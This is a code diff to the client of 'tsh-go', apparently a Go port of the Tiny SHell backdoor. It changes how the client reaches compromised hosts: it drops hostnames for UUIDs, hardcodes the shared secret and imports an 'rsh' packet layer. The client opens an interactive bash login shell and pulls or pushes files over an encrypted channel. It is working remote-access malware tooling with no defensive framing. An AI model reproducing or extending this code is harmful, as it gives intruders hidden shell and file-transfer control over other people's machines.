@@ -8,60 +8,56 @@ import (
 	"path/filepath"
 	"strings"
 
-	"tsh-go/internal/constants"
-	"tsh-go/internal/pel"
+	pel "tsh-go/internal/rsh"
 
 	"github.com/schollz/progressbar/v3"
 	"golang.org/x/crypto/ssh/terminal"
 )
 
 func Run() {
-	var secret string
 	var port int
 
 	flagset := flag.NewFlagSet(filepath.Base(os.Args[0]), flag.ExitOnError)
-	flagset.StringVar(&secret, "s", "1234", "secret")
-	flagset.IntVar(&port, "p", 60022, "port")
+	flagset.IntVar(&port, "p", 5220, "port")
 	flagset.Usage = func() {
-		fmt.Fprintf(flagset.Output(), "Usage: ./%s [-s secret] [-p port] <action>\n", flagset.Name())
+		fmt.Fprintf(flagset.Output(), "Usage: ./%s <action>\n", flagset.Name())
 		fmt.Fprintf(flagset.Output(), "  action:\n")
-		fmt.Fprintf(flagset.Output(), "        <hostname> [command]\n")
-		fmt.Fprintf(flagset.Output(), "        <hostname> get <source-file> <dest-dir>\n")
-		fmt.Fprintf(flagset.Output(), "        <hostname> put <source-file> <dest-dir>\n")
+		fmt.Fprintf(flagset.Output(), "        <uuid> [command]\n")
+		fmt.Fprintf(flagset.Output(), "        <uuid> get <source-file> <dest-dir>\n")
+		fmt.Fprintf(flagset.Output(), "        <uuid> put <source-file> <dest-dir>\n")
 		flagset.PrintDefaults()
 	}
 	flagset.Parse(os.Args[1:])
 
 	args := flagset.Args()
-	var host, srcfile, dstdir, command string
+	var uuid, srcfile, dstdir, command string
 	var mode uint8
 
 	if len(args) == 0 {
 		os.Exit(0)
 	}
 
-	host = args[0]
+	uuid = args[0]
 	args = args[1:]
 
 	command = "exec bash --login"
 	switch {
 	case len(args) == 0:
-		mode = constants.RunShell
+		mode = pel.RunShell
 	case args[0] == "get" && len(args) == 3:
-		mode = constants.GetFile
+		mode = pel.GetFile
 		srcfile = args[1]
 		dstdir = args[2]
 	case args[0] == "put" && len(args) == 3:
-		mode = constants.PutFile
+		mode = pel.PutFile
 		srcfile = args[1]
 		dstdir = args[2]
 	default:
-		mode = constants.RunShell
+		mode = pel.RunShell
 		command = args[0]
 	}
 
-	addr := fmt.Sprintf("%s:%d", host, port)
-	layer, err := pel.Dial(addr, "1234", false)
+	layer, err := pel.Dial(uuid, pel.PEL_SECRET, false)
 	if err != nil {
 		fmt.Printf("Authentication failed: %v\n", err)
 		os.Exit(0)
@@ -69,17 +65,17 @@ func Run() {
 	defer layer.Close()
 	layer.Write([]byte{mode})
 	switch mode {
-	case constants.RunShell:
+	case pel.RunShell:
 		handleRunShell(layer, command)
-	case constants.GetFile:
+	case pel.GetFile:
 		handleGetFile(layer, srcfile, dstdir)
-	case constants.PutFile:
+	case pel.PutFile:
 		handlePutFile(layer, srcfile, dstdir)
 	}
 }
 
 func handleGetFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
-	buffer := make([]byte, constants.Bufsize)
+	buffer := make([]byte, pel.Bufsize)
 
 	basename := strings.ReplaceAll(srcfile, "\\", "/")
 	basename = filepath.Base(filepath.FromSlash(basename))
@@ -106,7 +102,7 @@ func handleGetFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
 }
 
 func handlePutFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
-	buffer := make([]byte, constants.Bufsize)
+	buffer := make([]byte, pel.Bufsize)
 	f, err := os.Open(srcfile)
 	if err != nil {
 		return
@@ -172,8 +168,8 @@ func handleRunShell(layer *pel.PktEncLayer, command string) {
 		return
 	}
 
-	buffer := make([]byte, constants.Bufsize)
-	buffer2 := make([]byte, constants.Bufsize)
+	buffer := make([]byte, pel.Bufsize)
+	buffer2 := make([]byte, pel.Bufsize)
 	go func() {
 		_, _ = io.CopyBuffer(os.Stdout, layer, buffer)
 		layer.Close()
